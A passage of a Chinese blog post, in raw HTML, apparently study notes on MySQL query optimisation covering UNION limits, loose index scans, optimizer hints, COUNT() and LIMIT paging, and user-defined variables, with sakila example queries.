优化重写方式2：使用函数GROUP_CONCAT()在IN()中构造一个逗号分割的列表。</span><br><span class="line">   -- 优化重写方式3，使用EXISTS()等效的改写查询：</span><br><span class="line">   SELECT * FROM sakila.film</span><br><span class="line">    WHERE EXISTS(    </span><br><span class="line">        SELECT film_id FROM sakil.film_actor WHERE actor_id =1  </span><br><span class="line">          AND film_actor.film_id = film.film_id);</span><br></pre></td></tr></table></figure><ul><li><p>如何用好关联子查询</p><ul><li>并不是所有的关联子查询性能都很差，需要先测试再做出判断。很多时候，关联子查询是一种非常合理、自然、甚至是性能最好的写法。</li></ul></li></ul><h3 id="UNION的限制"><a href="#UNION的限制" class="headerlink" title="UNION的限制"></a>UNION的限制</h3><ul><li>有时，MySQL无法将限制条件从外层“下推”到内层，这使得原表能够限制部分返回结果的条件无法应用到内层查询的优化上。</li><li><p>如果希望UNION的各个子句能够根据LIMIT只取部分结果集，或者希望能够先排好序再合并结果集的话，就需要在UNION的各个子句中分别使用这些子句。另外，从临时表取出数据的顺序是不一定的，如果要获得正确的顺序，还需要加上一个全局的ORDER BY 和 LIMIT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`(SELECT first_name, last_name</span><br><span class="line"> FROM sakila.actor</span><br><span class="line"> ORDER BY last_name)</span><br><span class="line">UNION ALL</span><br><span class="line">(SELECT first_name, last_name</span><br><span class="line"> FROM sakila.customer</span><br><span class="line"> ORDER BY last_name)</span><br><span class="line">LIMIT 20;</span><br><span class="line">-- 在UNION子句分别使用LIMIT</span><br><span class="line">(SELECT first_name, last_name</span><br><span class="line"> FROM sakila.actor</span><br><span class="line"> ORDER BY last_name</span><br><span class="line"> LIMIT 20)</span><br><span class="line">UNION ALL</span><br><span class="line">(SELECT first_name, last_name</span><br><span class="line"> FROM sakila.customer</span><br><span class="line"> ORDER BY last_name</span><br><span class="line"> LIMIT 20)</span><br><span class="line">LIMIT 20;</span><br></pre></td></tr></table></figure></li></ul><h3 id="索引合并优化"><a href="#索引合并优化" class="headerlink" title="索引合并优化"></a>索引合并优化</h3><ul><li>5.0及其新版本，当WHERE条件包含多个复杂条件的时候，MySQL能够访问当个表的多个索引以合并和交叉过滤来定位需要查找的行。</li></ul><h3 id="等值传递"><a href="#等值传递" class="headerlink" title="等值传递"></a>等值传递</h3><ul><li><p>某些时候，等值传递会带来一些意想不到的额外消耗。例如，有一个非常大的IN()列表，而MySQL优化器发现存在WHERE、ON或者USING的子句，将这个列表的值和另一个表的某个列相关联。</p><ul><li>优化器会将IN()列表都复制应用到关联的各个表中。通常各个表因为新增了过滤条件，优化器可以更高效地从存储引擎过滤记录。但是如果列表非常大，则会导致优化和执行都会变得更慢。</li></ul></li></ul><h3 id="并行执行"><a href="#并行执行" class="headerlink" title="并行执行"></a>并行执行</h3><ul><li>MySQL无法利用多核特性来并行执行查询，这点和其他关系型数据库不一样。</li></ul><h3 id="哈希关联"><a href="#哈希关联" class="headerlink" title="哈希关联"></a>哈希关联</h3><ul><li>MySQL并不支持哈希关联——所有的关联都是嵌套循环关联。不过，可以通过建立一个哈希索引来曲线实现哈希关联。</li><li>如果使用的是Memory存储引擎，则索引是哈希索引，所以关联的时候也类似于哈希关联。</li></ul><h3 id="松散索引扫描"><a href="#松散索引扫描" class="headerlink" title="松散索引扫描"></a>松散索引扫描</h3><ul><li>MySQL并不支持松散索引扫描，也就无法按照不连续的方式扫描一个索引。通常，MySQL的索引扫描需要先定义一个起点和终点，即使需要的数据只是这段索引中很少数的几个，MySQL仍需要扫描这段索引中每一个字段。</li><li><p>示例：假设我们有索引(a,b)，有以下查询<code>SELECT ... FROM tb1 WHERE b BETEWEEN 2 AND 3;</code>，因为只使用了字段b而不符合索引的最左前缀，MySQL无法使用这个索引，从而只能通过全表扫描找到匹配的行。</p><p><a href="MySQL通过全表扫描找到需要的记录.png">MySQL通过全表扫描找到需要的记录</a><br>了解索引结构的话，会发现还有一个更快的办法执行上面的查询。索引的物理结构(不是存储引擎API)使得可以先扫描a列第一个值对应的b列的范围，然后在跳到a列第二个只扫描对应的b列的范围，即松散索引扫描。这时就无须再使用WHERE过滤，因为已经跳过了所有不需要的记录。<strong>MySQL并不支持松散索引扫描</strong><br><a href="松散索引扫描.png">松散索引扫描</a></p></li><li><p>MySQL5.0 以后的版本，某些特殊的场景下是可以使用松散索引扫描的。例如，在一个分组查询中需要找到分组的最大值和最小值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 在Extra字段显示“Using index <span class="keyword">for</span> group-by”,表示使用松散索引扫描</span><br><span class="line">EXPLAIN SELECT actor_id, MAX(film_id)</span><br><span class="line">FROM sakila.film_actor</span><br><span class="line">GROUP BY actor\G;</span><br></pre></td></tr></table></figure></li><li><p>在MySQL很好地支持松散索引扫描之前，一个简单的绕过办法就是给前面的列加上可能的常数值。5.6之后的版本，关于松散索引扫描的一些限制将会通过“索引条件下推(index condition pushdown)”的方式解决</p></li></ul><h3 id="最大值和最小值优化"><a href="#最大值和最小值优化" class="headerlink" title="最大值和最小值优化"></a>最大值和最小值优化</h3><ul><li><p>对于MIN()和MAX()查询，MySQL的优化做得并不好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">SELECT MIN(actor_id) FROM sakila.actor WHERE first_name = <span class="string">'PENELOPE'</span>;</span><br><span class="line">-- 因为在first_name上没有索引，MySQL将会进行一次全表扫描。如果MySQL能够进行主键扫描，那么理论上当MySQL读到第一个满足条件的记录，就是需要找到的最小值，因为主键是严格按照actor_id字段的大小顺序排列的。</span><br><span class="line">-- 曲线优化办法：移除MIN()，然后使用LIMITSELECT actor_id FROM sakila.actor USE INDEX(PRIMARY) WHERE first_name = <span class="string">'PENNLOPE'</span> LIMIT 1;</span><br><span class="line">-- 该SQL已经无法表达它的本意，一般我们通过SQL告诉服务器需要什么数据，再由服务器决定如何最优地获取数据。但有时候为了获得更高的性能，需要放弃一些原则。</span><br></pre></td></tr></table></figure><h3 id="在同一个表查询和更新"><a href="#在同一个表查询和更新" class="headerlink" title="在同一个表查询和更新"></a>在同一个表查询和更新</h3></li><li><p>MySQL不允许对同一张表同时进行查询和更新。这其实并不是优化器的限制，如果清楚MySQL是如何执行查询的，就可以避免这种情况。可以通过生成表来绕过该限制。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- 符合标准的SQL，但是无法运行</span><br><span class="line">mysql&gt; UPDATE tbl AS outer_tbl</span><br><span class="line">-&gt; SET cnt = (-&gt; SELECT count(*) FROM tbl AS inner_tbl</span><br><span class="line">-&gt; WHERE inner_tbl.type = outer_tbl.type-&gt; </span><br><span class="line">);</span><br><span class="line">-- 生成表来绕过该限制：</span><br><span class="line">mysql&gt; UPDATE tbl</span><br><span class="line">-&gt; INNER JOIN(</span><br><span class="line">-&gt; SELECT <span class="built_in">type</span>, count(*) AS cnt</span><br><span class="line">-&gt; FROM tbl-&gt; GROUP BY <span class="built_in">type</span></span><br><span class="line">-&gt; ) AS der USING(<span class="built_in">type</span>)</span><br><span class="line">-&gt; SET tbl.cnt = der.cnt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="查询优化器的提示-hint"><a href="#查询优化器的提示-hint" class="headerlink" title="查询优化器的提示(hint)"></a>查询优化器的提示(hint)</h2><p>如果对优化器选择的执行计划不满意，可以使用优化器提供的几个提示(hint)来控制最终的执行计划。不过MySQL升级后可能会导致这些提示无效，需要重新审查。</p><ul><li><p>部分提示类型：</p><ul><li><p>HIGH_PRIORITY和LOW_PRIORITY:<br>告诉MySQL当多个语句同时访问某一个表的时候，这些语句的优先级。只对使用表锁的存储引擎有效，但即使是在MyISAM中也要慎重，因为这两个提示会导致并发插入被禁用，可能会导致严重降低性能</p><ul><li>HIGH_PRIORITY：用于SELECT语句时，MySQL会将此语句重新调度到所有正在等待表锁以便修改数据的语句之前。实际上是将其放在表的队列的最前面，而不是按照常规顺序等待。用于INSERT语句，其效果只是简单地抵消了全局LOW_PRIORITY设置对该语句的影响。</li><li>用于SELECT、INSERT、UPDATE和DELETE语句，让该语句一直处于等待状态，只要队列中还有需要访问同一个表的语句——即使那些比该语句还晚提交到服务器的语句。</li></ul></li><li><p>DELAYED：</p><ul><li>只对INSERT和REPLACE有效。</li><li>MySQL会将使用该提示的语句立即返回给客户端，并将插入的行数据放入到缓冲区，然后在表空闲时批量将数据写入。</li><li>日志系统使用这样的提示非常有效，或者是其他需要写入大量数据但是客户端却不需要等待单条语句完成IO的应用。</li><li>限制：并不是所有的存储引擎都支持；并且该提示会导致函数LAST_INSERT_ID()无法正常工作</li></ul></li><li><p>STRAIGHT_JOIN:<br>当MySQL没能正确选择关联顺序的时候，或者由于可能的顺序太多导致MySQL无法评估所有的关联顺序的时候，STRAIGNT_JOIN都会很有用。特别是在以下第二种情况，MySQL可能会花费大量时间在”statistics“状态，加上这个提示会大大减少优化器的搜索空间。<br>可以先使用EXLPAN语句来查看优化器选择的关联顺序，然后使用该提示来重写查询，确定最优的关联顺序。但是在升级MySQL的时候，要重新审视这类查询。</p><ul><li>放置在SELECT语句的SELECT关键字之后：让查询中所有的表按照在语句中出现的顺序进行关联</li><li>放置在任何两个关联表的名字之间：固定其前后两个表的关联顺序。</li></ul></li><li><p>SQL_SMALL_RESULT和SQL_BIG_RESULT：</p><ul><li>只对SELECT语句有效，告诉优化器对GROUP BY或者DISTINCT查询如何使用临时表和排序。</li><li>SQL_SMALL_RESULT告诉优化器结果集很小，可以将结果集放在内存中的索引临时表，避免排序操作</li><li>SQL_BIG_RESULT告诉优化器结果集可能会非常大，建议使用磁盘临时表做排序操作</li></ul></li><li><p>SQL_BUFFER_RESULT：</p><ul><li>告诉优化器将查询结果放入到一个临时表，然后尽可能地释放表锁。</li></ul></li><li><p>SQL_CACHE和SQL_NO_CACHE</p><ul><li>告诉MySQL这个结果集是否应该缓存在查询缓存中</li></ul></li><li><p>SQL_CALC_FOUND_ROWS：</p><ul><li>严格来说，并不是一个优化器提示，它不会告诉优化器任何关于执行计划的东西。</li><li>让MySQL返回的结果集包含更多信息。</li><li>查询中加上该提示MySQL会计算除去LIMIT子句后这个查询要返回的结果集的总数，而实际上只返回LIMIT要求的结果集</li></ul></li><li><p>FOR UPDATE和LOCK IN SHARE MODE</p><ul><li>也不是真正的优化器提示。</li><li>主要控制SELECT语句的锁机制，但只对实现了行级锁的存储引擎有效。</li><li>会对符合查询条件的数据行加锁。对于INSERT…SELECT语句是不需要这两个提示的，因为5.0及新版本会默认加锁。</li><li>InnoDB是唯一内置支持这两个提示的引擎。但是这两个提示会让某些优化无法正常使用，例如索引覆盖扫描。InnoDB不能在不访问主键的情况下排他地锁定行，因为行的版本信息保存在主键中。</li><li>这两个提示经常被滥用，很容易造成服务器的锁争用问题，应该尽可能避免使用。</li></ul></li><li><p>USING INDEX、IGONRE INDEX和FORCE INDEX：</p><ul><li>告诉优化器使用或不使用哪些索引来查询记录(例如，在决定关联顺序的时候使用哪个索引)。</li><li>5.1及新版本可以通过FOR ORDER BY和FOR GROUP BY来制定是否对排序和分组有效。</li><li>USING INDEX和FORCE INDEX基本相同。但是FORCE INDEX会告诉优化器全表扫描的成本会远远高于索引扫描，哪怕实际上该索引的用处不大。当发现优化器选择了错误的索引，或者因为某些原因(比如在不适用ORDER BY的时候希望结果有序)要使用另一个索引时，可以使用该提示。</li></ul></li></ul></li><li><p>5.0和更新版本新增用来控制优化器行为的参数：</p><ul><li>optimizer_search_depth:控制优化器在穷举执行计划时的限度。如果查询长时间处于”Statistics”状态，可以考虑调低</li><li>optimizer_prune_level:默认打开，让优化器根据需要扫描的行数来决定是否跳过某些执行计划</li><li>optimizer_swith:包含了一些开启/关闭优化器特性的标志位。</li></ul></li></ul><h2 id="优化特定类型的查询"><a href="#优化特定类型的查询" class="headerlink" title="优化特定类型的查询"></a>优化特定类型的查询</h2><h3 id="优化count-查询"><a href="#优化count-查询" class="headerlink" title="优化count()查询"></a>优化count()查询</h3><ul><li><p>count()的作用：</p><ul><li>统计某个列值的数量，要求列值是非空的(不统计NULL)。如果在COUNT()的括号中指定了列或者列的表达式，则统计的就是这个表达式有值的结果数(而不是NULL)</li><li><p>统计行数。当MySQL确认括号内的表达式值不可能为空时，实际上就是统计行数。</p><ul><li>当使用COUNT(<em>)时，</em>并不会像我们猜想的扩展成所有的列，实际上，它会忽略所有的列而直接统计所有的行数。</li><li>常见错误：在括号内指定了一个列却希望统计结果集的行数。</li></ul></li></ul></li><li><p>关于MyISAM的神话：</p><ul><li>只有没有任何WHERE条件的count(*)，MyISAM的COUNT()函数才会非常快，因为此时无须实际地去计算表的行数。MySQL可以利用存储引擎的特性直接获得这个值。</li><li>如果MySQL知道某列col不可能为NULL值，那么内部会把count(col)优化成count(*)</li><li>当统计带有WHERE子句，MyISAM的COUNT()和其他存储引擎没有任何不同，就不会再有神话般的速度。</li></ul></li><li><p>简单的优化</p><ul><li><p>利用MyISAM在count(*)全表非常快的特性，来加速一些特定条件的查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 使用标准数据据worold</span><br><span class="line">SELECT count(*) FROM world.city WHERE ID &gt; 5;</span><br><span class="line">-- 将条件反转，可很大程度减少扫描行数到5行以内</span><br><span class="line">SELECT (SELECT count(*) FROM world.city) - COUNT(*)</span><br><span class="line"> FROM world.city WHERE ID &lt;= 5;</span><br></pre></td></tr></table></figure></li><li><p>示例：假设可能需要通过一个查询返回各种不同颜色的商品数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 使用SUM</span><br><span class="line">SELECT SUM(IF(color = <span class="string">'blue'</span>, 1, 0)) AS blue,SUM(IF(color = <span class="string">'red'</span>, 1, 0)) AS red FROM items;</span><br><span class="line">-- 使用COUNT，只需要将满足条件的设置为真，不满足设置为NULL</span><br><span class="line">SELECT COUNT(color = <span class="string">'blue'</span> OR NULL) AS blue, COUNT(color = <span class="string">'red'</span> OR NULLASred FROM items;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用近似值：</p><ul><li>有时候某些业务场景并不要求完全精确的COUNT值，此时可以用近似值来代替。</li><li>EXPLAIN出来的优化器估算的行数就是一个不错的近似值，执行EXPLAIN并不需要真正地去执行查询，所以成本很低。</li><li>例如：如果要精确统计网站在线人数，通常WHERE条件会很复杂，一方面需要过滤当前非活跃用户，另一方面还需要过滤系统中某些特定ID的默认用户，去掉这些约束条件对总数的影响很小，但却可能很好地提高该查询的性能。更进一步优化则可以尝试删除DISTINCT这样的约束来避免文件排序。这样重写的查询比精确查询要快得多，而返回的结果则几乎相同。</li></ul></li><li><p>更复杂的优化：</p><ul><li>通常来说，COUNT()都需要扫描大量的行(意味着要访问大量数据)才能获得精确的结果，因此是很难优化的。</li><li><p>优化方法：</p><ul><li>前面提到的方法</li><li>在MySQL层面能做的只有索引覆盖扫描</li><li>考虑修改应用架构，可以增加汇总表，或者类似Memcached这样的外部缓存系统。可能很快你就会发现陷入到一个熟悉的困境，”快速、精确和实现简单“，三者永远只能满足其二，必须舍掉其中一个。</li></ul></li></ul></li></ul><h3 id="优化关联查询"><a href="#优化关联查询" class="headerlink" title="优化关联查询"></a>优化关联查询</h3><ul><li><p>确保ON或者USING子句的列上有索引。</p><ul><li>在创建索引的时候就需要考虑关联的顺序。当表A和表B用列c关联的时候，入股优化器的关联顺序是B、A，那么就不需要在B表的对应列上创建索引。没有的索引智慧带来额外的负担。</li><li>一般来说，除非有其他理由，否则只需要在关联顺序的第二个表的响应列上创建索引。</li></ul></li><li>确保任何的GROUP BY和ORDER BY中的表达式只涉及到一个表中的列，这样MySQL才有可能使用索引来优化这个过程。</li><li>当升级MySQL的时候需要注意：关联语法、运算符优先级等其他可能会发生变化的地方。因为以前是普通关联的地方可能会变成笛卡儿积，不同类型的关联可能会生成不同的结果。</li></ul><h3 id="优化子查询"><a href="#优化子查询" class="headerlink" title="优化子查询"></a>优化子查询</h3><ul><li>尽可能使用关联查询代替。这并不是绝对的，5.6及新版本或者MariaDB，可以直接使用子查询。</li></ul><h3 id="优化GROUP-BY和DISTINCT"><a href="#优化GROUP-BY和DISTINCT" class="headerlink" title="优化GROUP BY和DISTINCT"></a>优化GROUP BY和DISTINCT</h3><ul><li>在很多场景下，MySQL都使用同样的办法优化这两种查询，事实上，MySQL优化器会在内部处理的时候相互转换这两类查询。它们都可以使用索引来优化，这也是最有效的优化办法。</li><li>当无法使用索引时，GROUP BY使用两种策略：使用临时表或者文件排序来做分组。可以通过提示SQL_BIG_RESULT和SQL_SMALL_RESULT来让优化器按照你希望的方式运行。</li><li><p>如果需要对关联查询做分组GROUP BY，并且是按照查找表中的某个列进行分组，那么通常采用查找表的标识列分组的效率会比其他列更高</p><ul><li><strong>SELECT后面出现的非分组列一定是直接依赖于分组列，并且在每个组内的值是唯一的，或者是业务上根本不在乎这个值具体是什么。</strong></li><li>在分组查询的SELECT中直接使用非分组列通常不是什么好主意，因为这样的结果通常是不定的，当索引改变，或者优化器选择不同的优化策略时都可能导致结果不一样。</li></ul></li><li>如果没有通过ORDER BY子句显示地制定排序列，当查询使用GROUP BY子句的时候，结果集会自动按照分组的字段进行排序。如果不关心结果集的排序，而这种默认排序又导致了需要文件排序，则可以使用ORDER BY NULL，让MySQL不再进行文件排序。</li><li><p>优化GROUP BY WITH ROLLUP：</p><ul><li><p>分组查询的一个变种就按要求MySQL对返回的分组结果在做一次超级聚合。可以使用WITH ROLLUP子句来实现这种逻辑，但可能会不够优化。</p><ul><li>很多时候，如果可以在应用程序中做超级聚合是更好的，虽然这需要返回给客户端更多的结果。</li><li>也可以在FROM子句中嵌套使用子查询，或者是通过一个临时表存放中间数据，然后和临时表执行UNION来得到最终结果</li><li>最好的办法是尽可能将WITH ROLLUP功能转移到应用程序中处理。</li></ul></li></ul></li></ul><h3 id="优化LIMIT分页"><a href="#优化LIMIT分页" class="headerlink" title="优化LIMIT分页"></a>优化LIMIT分页</h3><ul><li>在系统中需要进行分页操作的时候，通常会使用LIMIT加上偏移量的办法来实现，同时加上合适的ORDER BY子句。如果有对应的索引，通常效率会很不错，否则，MySQL需要做大量的文件排序操作。</li><li><p>偏移量非常大的时候优化办法：</p><ul><li>在页面中限制分页的数量</li><li><p>优化大偏移量的性能：</p><ul><li>尽可能使用覆盖索引扫描，而不是查询所有的列。例如使用延迟关联</li><li>有时可以将LIMIT查询转换为已知位置的查询，让MySQL通过范围扫描获得对应的结果。</li><li>使用”书签”记录上一次取数据的位置。</li><li>使用预先计算的汇总表，或者关联到一个冗余表，冗余表只包含主键列和需要做排序的数据列。<h3 id="优化SQL-CALC-FOUND-ROWS"><a href="#优化SQL-CALC-FOUND-ROWS" class="headerlink" title="优化SQL_CALC_FOUND_ROWS"></a>优化SQL_CALC_FOUND_ROWS</h3></li></ul></li></ul></li></ul><p>分页的时候，另一个常用的技巧是在LIMIT语句中加上SQL_CALC_FOUND_ROWS提示，这样就可以获得去掉LIMIT以后满足条件的行数，因此可以作为分页的总数。加上这个提示后，MySQL不管是否需要都会扫描所有满足条件的行，然后抛弃掉不需要的行，而不是在满足LIMIT的行数后就终止扫描。所以该提示的代价可能非常高。</p><ul><li>设计方案1：将具体的页数换成“下一页”按钮，假设每页显示20条记录，那么使用LIMIT返回21条并只显示20条，如果第21条存在，那么显示“下一页”按钮，否则说明没有更多的数据，也就无须显示</li><li>设计方案2：先获取并缓存较多的数据，然后每次分页都从这个缓存中获取。</li><li>其他设计方案：有时候也可以考虑使用EXPLAIN的结果中的rows列的值来作为结果集总数的近似值(实际上Google的搜索结果总数也是个近似值)。当需要精确结果时，再单独使用COUNT(*)来满足需求，这时候如果能够使用覆盖索引则通常也会比SQL_CALC_FOUND_ROWS快得多。</li></ul><h3 id="优化UNION查询"><a href="#优化UNION查询" class="headerlink" title="优化UNION查询"></a>优化UNION查询</h3><ul><li>MySQL总是通过创建并填充临时表的方式来执行UNION查询。因此很多优化策略都没法很好的使用。经常需要手动地将WHERE、LIMIT、ORDER BY子句下推UNION的各个子查询中，以便优化器可以充分利用这些条件进行优化</li><li><p>除非确实需要服务器消除重复的行，否则就一定要使用UNION ALL。</p><ul><li>如果没有ALL关键字，MySQL会给临时表加上DISTINCT选项，这会导致对整个临时表做唯一性检查，这样做的代价非常高。</li><li>即使有ALL关键字，MySQL仍然会使用临时表存储结果。</li></ul></li></ul><h3 id="静态查询分析"><a href="#静态查询分析" class="headerlink" title="静态查询分析"></a>静态查询分析</h3><blockquote><p>Percona Toolkit contains <em>pt-query-advisor</em>, a tool that parses a log of queries, analyzes<br>    the query patterns, and gives annoyingly detailed advice about potentially bad practices<br>    in them. </p></blockquote><h3 id="使用用户自定义变量"><a href="#使用用户自定义变量" class="headerlink" title="使用用户自定义变量"></a>使用用户自定义变量</h3><ul><li>用户自定义变量是一个用来存储内容的临时容器，在连接MySQL的整个过程中都存在。在查询中混合使用过程化和关系化逻辑的时候，该特性非常有用。</li><li><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET @one       := 1;</span><br><span class="line">SET @min_actor := (SELECT MIN(actor_id) FROM sakila.actor);</span><br><span class="line">SET @last_week := CURRENT_DATE - INTERVAL 1 WEEK;</span><br><span class="line">SELECT ... WHERE col &lt;= @last_week;</span><br><span class="line">-- 具有“左值”特性，在给一个变量赋值的同时使用这个变量</span><br><span class="line">SELECT actor_id, @rownum := @rownum + 1 As rownum ...</span><br></pre></td></tr></table></figure></li><li><p>无法使用的场景：</p><ul><li>使用自定义变量的查询，无法使用查询缓存</li><li>不能在使用常量或者标识符的地方使用自定义变量，例如表名、列名和LIMIT子句中。</li><li>用户自定义变量的生命周期是在一个连接中有效，所以不能用它们来做连接中的通信。</li><li>如果使用连接池或者持久化连接，自定义变量可能让看起来毫无关系的代码交互(如果是这样，通常是代码或连接池bug)</li><li>在5.0之前的版本，是大小写敏感的，所以要注意代码在不同MySQL版本间的兼容性问题。</li><li>不能显示地声明自定义变量的类型。确定未定义变量的具体类型的时机在不同MySQL版本中也可能不一样。如果希望是整形/浮点/字符串，最好初始化时0/0.0/‘’。MySQL的用户自定义变量是一个动态类型，在赋值的时候会改变。</li><li>MySQL优化器在某些场景下可能会将这些变量优化掉，这可能导致代码不按预想的方式运行。</li><li>赋值的顺序和赋值的时间点并不总是固定的，这依赖于优化器的决定。实际情况可能让人困惑。</li><li>赋值符号:=的优先级非常低，所以要注意，赋值表达式应该使用明确的括号。</li><li>使用未定义变量不会产生任何语法错误，如果没注意到这一点，非常容易犯错。</li></ul></li><li><p>应用场景：</p><ul><li>优化排名语句：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 查询获取演过最多电影的前10位演员，然后根据出演电影次数做一个排名，如果出演次数一样，则排名相同。</span><br><span class="line">mysql&gt; SET @curr_cnt := 0, @prev_cnt := 0, @rank := 0;</span><br><span class="line">-&gt; SELECT actor_id,-&gt; @curr_cnt := cnt AS cnt,</span><br><span class="line">-&gt; @rank := IF(@prev_cnt &lt;&gt; @curr_cnt, @rank + 1, @rank) AS rank,</span><br><span class="line">-&gt; @prev_cnt := @curr_cnt AS dummy</span><br><span class="line">-&gt; FROM (-&gt; SELECT actor_id, COUNT(*) AS cnt</span><br><span class="line">-&gt; FROM sakila.film_actor-&gt; GROUP BY actor_id</span><br><span class="line">-&gt; ORDER BY cnt DESC-&gt; LIMIT 10-&gt; ) as der;</span><br></pre></td></tr></table></figure></li></ul><pre><code>*   避免重复查询刚刚更新的数据：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 在更新行的同时又希望获取得到该行的信息。虽然看起来仍然需要两个查询和两次网络来回，但第二个查询无须访问任何数据表，速度会快很多</span><br><span class="line">UPDATE t1 SET lastUpdated = NOW() WHERE id = 1 AND @now := NOW();</span><br><span class="line">SELECT @now;</span><br></pre></td></tr></table></figure>*   统计更新和插入的数量<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 使用了INSERT ON DUPLICATE KEY UPDATE的时候，想统计插入了多少行的数据，并且有多少数据是因为冲突而改写成更新操作。</span><br><span class="line">-- 实现该办法的本质如下，当每次由于冲突导致更新时对变量@x自增一次，然后通过对这个表达式乘以0来让其不影响要更新的内容</span><br><span class="line">INSERT INTO t1(c1, c2) VALUES(4, 4), (2, 1), (3, 1)</span><br><span class="line">ON DUPLICATE KEY UPDATEc1 = VALUES(c1) + ( 0 * ( @x := @x +1 ) );</span><br></pre></td></tr></table></figure>*   确定取值的顺序    *   一个最常见的问题，没有注意到在赋值和读取变量的使用可能是在查询的不同阶段。        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- WHERE和SELECT是在查询执行的不同阶段被执行的，而WHERE是在ORDER BY文件排序操作之前执行。</span><br><span class="line">mysql&gt; SET @rownum := 0;</span><br><span class="line">mysql&gt; SELECT actor_id, @rownum := @rownum + 1 AS cnt</span><br><span class="line">-&gt; FROM sakila.actor</span><br><span class="line">-&gt; WHERE @rownum &lt;= 1;</span><br><span class="line">+----------+------+</span><br><span class="line">| actor_id | cnt  |</span><br><span class="line">+----------+------+</span><br><span class="line">| 1        | 1    |</span><br><span class="line">| 2        | 2    |</span><br><span class="line">+----------+------+</span><br></pre></td></tr></table></figure>    *   尽量让变量的赋值和取值发生在执行查询的同一个阶段。    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET @rownum := 0;</span><br><span class="line">mysql&gt; SELECT actor_id, @rownum AS rownum</span><br><span class="line">-&gt; FROM sakila.actor</span><br><span class="line">-&gt; WHERE (@rownum := @rownum + 1) &lt;= 1;</span><br></pre></td></tr></table></figure>    *   将赋值运距放到LEAST()，这样就可以完全不改变排序顺序的时候完成赋值操作。这个技巧在不希望对子句的执行结果有影响却又要完成变量复制的时候很有用。这样的函数还有GREATEST(), LENGTH(), ISNULL(), NULLIF(), IF(), 和COALESCE()。    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- LEAST()总是返回0</span><br><span class="line">mysql&gt; SET @rownum := 0;</span><br><span class="line">mysql&gt; SELECT actor_id, first_name, @rownum AS rownum</span><br><span class="line">-&gt; FROM sakila.actor-&gt; WHERE @rownum &lt;= 1</span><br><span class="line">-&gt; ORDER BY first_name, LEAST(0, @rownum := @rownum + 1);</span><br></pre></td></tr></table></figure></code></pre><ul><li><p>编写偷懒的UNION:<br>假设需要编写一个UNION查询，其第一个子查询作为分支条件先执行，如果找到了匹配的行，则跳过第二个分支。在某些业务场景中确实会有这样的需求，比如现在一个频繁访问的表中查找“热”数据，找不到再去另外一个较少访问的表中查找“冷数据“。(区分热冷数据是一个很好提高缓存命中率的办法)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- 在两个地方查找一个用户，一个主用户表，一个长时间不活跃的用户表，不活跃的用户表的目的是为了实现更高效的归档。</span><br><span class="line">-- 旧的UNION查询，即使在users表中已经找到了记录，上面的查询还是会去归档表中再查找一次。</span><br><span class="line">SELECT id FROM users WHERE id = 123</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT 